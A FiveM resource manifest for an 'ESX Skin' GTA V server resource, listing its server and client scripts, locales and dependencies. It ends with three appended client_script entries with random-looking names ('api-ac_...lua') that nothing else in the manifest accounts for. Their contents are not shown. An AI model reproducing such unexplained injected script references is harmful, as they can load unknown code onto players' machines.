fx_version "bodacious"

games {"gta5"}
lua54 'yes'
--
description 'ESX Skin'

version '1.1.0'

server_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'@oxmysql/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'skinchanger'
}


client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"